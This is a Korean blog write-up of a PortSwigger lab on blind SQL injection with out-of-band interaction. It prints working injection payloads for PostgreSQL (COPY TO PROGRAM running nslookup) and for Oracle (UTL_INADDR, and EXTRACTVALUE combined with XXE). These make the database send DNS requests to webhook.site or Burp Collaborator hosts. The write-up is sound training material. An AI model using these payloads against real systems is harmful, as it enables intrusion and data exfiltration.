+++
date = '2026-05-21T17:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Blind SQL injection with out-of-band interaction'
summary = "응답 내용·오류·시간 어떤 인밴드 신호도 없는 환경에서, DB가 외부로 DNS 조회를 수행하도록 유도해 취약점을 확인하는 OAST(Out-of-band) 기법 풀이 (Oracle)"
toc = true
tags = ["SQL Injection", "Blind SQLi", "OAST", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-interaction)

> ![image.png](/writeup/portswigger/sqli/14/1.png)

Tracking Cookie 값이 SQL 쿼리에 사용되며, 이 지점에 Blind SQL Injection 취약점이 존재한다.  
쿼리 결과, 오류, 시간 지연 등 어떤 인밴드(in-band) 신호도 관측할 수 없지만, 외부와의 상호작용(Out-of-band)은 유발할 수 있다. DBMS가 외부로 DNS 조회를 수행하도록 만들면 문제가 해결된다.

### SQL Injection 진단

외부 상호작용이 가능하다고 했으므로, 먼저 임의의 외부 서비스(webhook.site)로 요청이 도착하는지 확인하는 페이로드를 DBMS별로 시도한다.

PostgreSQL의 `COPY ... TO PROGRAM` 을 이용한 시도:

```sql
'; copy (SELECT '') to program 'nslookup <your-webhook-id>.webhook.site';--
```

Oracle의 `UTL_INADDR` 를 이용한 시도:

```sql
'||(SELECT UTL_INADDR.get_host_address('<your-webhook-id>.webhook.site'))--
```

두 시도 모두 요청이 수신되지 않았다. 문제 Note를 다시 확인하니, PortSwigger는 학습 플랫폼이 제3자를 공격하는 데 악용되는 것을 막기 위해 방화벽으로 랩과 임의 외부 시스템 간 통신을 차단하며, **Burp Collaborator 서버만 허용**한다고 명시되어 있었다.

![image.png](/writeup/portswigger/sqli/14/2.png)

---

## 익스플로잇

Burp Suite Professional(평가판)을 활성화한 뒤 Collaborator 기능으로 다시 시도한다.  
Oracle의 `EXTRACTVALUE` 와 XXE(외부 엔티티)를 조합해, 외부 엔티티의 대상 도메인을 Collaborator 주소(`*.oastify.com`)로 지정하면 DBMS가 해당 도메인으로 DNS 조회를 수행한다.

```sql
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://<collaborator-id>.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```

Collaborator에 DNS/HTTP 요청이 수신되며 문제가 해결된다.

![image.png](/writeup/portswigger/sqli/14/3.png)

![image.png](/writeup/portswigger/sqli/14/4.png)

---

## 정리

OAST(Out-of-band Application Security Testing)는 응답 내용·오류·시간 어떤 인밴드 신호도 없을 때, DB가 외부로 네트워크 요청(주로 DNS)을 보내도록 유도해 취약점을 확인·악용하는 기법이다.  
Oracle은 `EXTRACTVALUE` 와 XXE를 조합하거나 `UTL_HTTP`·`UTL_INADDR` 를, PostgreSQL은 `COPY ... TO PROGRAM` 등을 사용해 외부 요청을 유발한다.  
주의할 점은 PortSwigger 랩은 서드파티 악용을 막기 위해 아웃바운드 트래픽을 Burp Collaborator(`*.oastify.com`)로만 허용한다는 것이다. 따라서 webhook.site 같은 임의 외부 서비스로는 상호작용이 확인되지 않으며, 이 랩을 풀려면 Burp Suite Professional이 필요하다.  
여기서 한 단계 더 나아가 조회한 값을 서브도메인에 실어 보내면 데이터까지 직접 빼낼 수 있으며, 이는 다음 랩에서 다룬다.